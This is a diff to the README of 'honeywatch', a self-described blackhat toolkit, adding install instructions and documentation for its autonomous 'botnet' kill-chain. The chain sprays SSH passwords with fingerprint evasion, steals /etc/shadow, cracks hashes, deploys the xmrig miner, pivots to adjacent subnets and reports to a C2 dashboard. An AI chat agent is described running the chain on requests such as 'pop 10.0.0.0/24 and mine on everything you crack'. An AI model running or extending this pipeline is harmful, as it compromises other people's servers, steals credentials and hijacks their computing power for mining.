@@ -170,22 +170,107 @@ honeywatch stats --json             # machine-readable
 
 ### Install
 
-```bash
-# from the repo root
-python -m pip install -e .
+honeywatch runs on **Python 3.10+** and has **zero required runtime
+dependencies** — the core is pure stdlib. What you *can* do depends on the
+platform: Linux gives you the full pipeline (the scanners + the high-opsec
+`sshpass` spray backend + `hashcat`/`john`); Windows can crack, spray, grab,
+and deploy against hosts you name explicitly but has no native `masscan`/`zmap`.
+For the full blackhat pipeline on Windows, use **WSL2 or a Linux VPS**.
 
-# run from anywhere
+#### 1. Get the repo (both platforms)
+
+```bash
+git clone https://github.com/CL-BAF/Nightglass.git
+cd Nightglass
+python -m pip install -e .          # zero deps pulled
 honeywatch --version
-honeywatch --help
 ```
 
-The install pulls **zero** runtime dependencies. Optional extras, if you want
-them:
+#### 2. Optional extras (both platforms)
 
 ```bash
-pip install -e .[full]   # paramiko — enables --probe-level full (host key)
-pip install -e .[dev]    # pytest — run the test suite
+python -m pip install -e .[full]   # paramiko -- full host-key probing, the
+                                   #           cracker/sprayer/grab SSH backends
+python -m pip install -e .[c2]     # aiohttp + websockets -- the C2 dashboard +
+                                   #                      worker WebSocket transport
+python -m pip install -e .[dev]    # pytest -- run the test suite
+# all at once:
+python -m pip install -e .[full,c2,dev]
 ```
+
+Without `paramiko` the SSH cracker/sprayer/grab backends report
+`paramiko unavailable` and `--probe-level full` silently degrades to `fast`.
+
+#### 3a. Linux — full capability (recommended for the whole chain)
+
+Install the external binaries the different phases shell out to:
+
+```bash
+# Debian / Ubuntu
+sudo apt-get update
+sudo apt-get install -y \
+  masscan zmap nmap \
+         # recon: port scan + service probe (Linux-only binaries)
+  hashcat john \
+               # escalate: offline /etc/shadow cracking
+  sshpass \
+                 # high-opsec spray backend (genuine OpenSSH HASSH)
+  python3-dev libssl-dev libffi-dev \
+         # build deps so `pip install paramiko` compiles cleanly
+  build-essential
+
+# Fedora / RHEL
+sudo dnf install -y masscan zmap nmap hashcat john sshpass \
+                   python3-devel openssl-devel libffi-devel gcc
+
+python -m pip install -e .[full,c2,dev]
+```
+
+Verify:
+
+```bash
+honeywatch probe 1.2.3.4 --probe-level full --skip-vpn-check   # uses paramiko
+honeywatch spray 10.0.0.5 --passwords 'Summer2024!' --skip-vpn-check  # uses sshpass
+honeywatch hashcrack ./shadow --wordlist rockyou.txt --tool hashcat      # uses hashcat
+```
+
+`masscan`/`zmap` need **root** (raw sockets). `honeywatch scan` runs them via
+`sudo` automatically if your user is in the right group, or prefix with `sudo`.
+
+#### 3b. Windows — explicit-host mode (no native scanners)
+
+```powershell
+# 1. Install Python 3.10+ from https://python.org (tick "Add Python to PATH")
+# 2. Install Git from https://git-scm.com
+# 3. Then in PowerShell or cmd:
+
+git clone https://github.com/CL-BAF/Nightglass.git
+cd Nightglass
+python -m pip install -e .[full]     # paramiko ships a Windows wheel, no build deps
+
+# These work on Windows (point at hosts explicitly):
+python -m honeywatch probe 1.2.3.4 --probe-level full --skip-vpn-check
+python -m honeywatch crack 10.0.0.5 --wordlist rockyou.txt --skip-vpn-check
+python -m honeywatch spray 10.0.0.5 --passwords 'Summer2024!' --skip-vpn-check
+```
+
+What does **not** work natively on Windows:
+
+- `honeywatch scan` / `botnet` recon phase — `masscan`/`zmap`/`nmap` are
+  Linux binaries. Use **WSL2** (`wsl --install -d Ubuntu`) or a Linux VPS for
+  discovery, then the rest of the chain works.
+- The high-opsec `sshpass` spray backend — `sshpass` isn't on Windows, so the
+  sprayer falls back to paramiko (flagged as a residual HASSH risk). For the
+  genuine OpenSSH client fingerprint, run the spray from WSL/Linux.
+- `hashcat`/`john` — install the **Windows builds** (`hashcat.exe` from
+  hashcat.net, John the Ripper Windows build) and pass `--bin`:
+
+```powershell
+python -m honeywatch hashcrack .\shadow --wordlist rockyou.txt --tool hashcat --bin C:\Tools\hashcat.exe
+```
+
+**Recommended:** run the whole pipeline from **WSL2** or a Linux box so the
+scanners, `sshpass`, `hashcat`, and `john` are all one `apt-get` away.
 
 ### Make the AI available
 
@@ -195,6 +280,13 @@ honeywatch uses **Ollama Cloud models only** — you need an API key:
 export OLLAMA_API_KEY=ollama_...          # create one at https://ollama.com/settings/keys
 export HONEYWATCH_MODEL=gpt-oss:20b       # optional; default is llama3.1:8b
 export HONEYWATCH_AI_BASE=https://ollama.com/v1   # optional; this is the default
+```
+
+On Windows PowerShell:
+
+```powershell
+$env:OLLAMA_API_KEY = "ollama_..."
+$env:HONEYWATCH_MODEL = "gpt-oss:20b"
 ```
 
 With no key the AI stage is skipped and scores fall back to pure heuristics
@@ -530,6 +622,38 @@ honeywatch spray --target-label real --min-confidence 0.8 \
 # ever discovered (password reuse = botnet growth)
 honeywatch spray --reuse-creds --skip-vpn-check
 ```
+
+### Autonomous chain (`honeywatch botnet`)
+
+The orchestrator that makes honeywatch self-running. One command drives the
+full kill-chain and **loops on growth** — every pivot that surfaces new
+adjacent subnets feeds back into a fresh recon round:
+
+```
+recon -> enumerate (auth-method precheck) -> spray -> foothold (grab shadow)
+  -> escalate (offline hashcrack) -> persist (deploy xmrig) -> pivot (adjacent
+  /24s from footholds) -> back to recon
+```
+
+State is durable in the SQLite store, so a killed run resumes from what's
+already known. Opsec defaults are threaded into every network phase (the
+`--business-hours`, `--proxy-file`/`--jump-file`, `--delay`/`--jitter` knobs
+all apply).
+
+```bash
+# Full autonomous run against a range: discover, spray, pop, crack shadows,
+# deploy xmrig, pivot to adjacent /24s, repeat up to 3 rounds.
+honeywatch botnet 10.0.0.0/24 \
+  --users admin,root,ubuntu --passwords 'Summer2024!' \
+  --pool stratum+tcp://pool.example.com:3333 --wallet YOUR_WALLET \
+  --hashcrack-wordlist rockyou.txt \
+  --business-hours --proxy-file proxies.txt \
+  --max-rounds 3 --skip-vpn-check
+```
+
+The chat agent gets the same power via the `run_chain` tool, so
+*"pop 10.0.0.0/24 and mine on everything you crack"* runs the whole chain.
+See [docs/opsec.md](docs/opsec.md) for the threat model behind each phase.
 
 ### C2 controller / dashboard
 
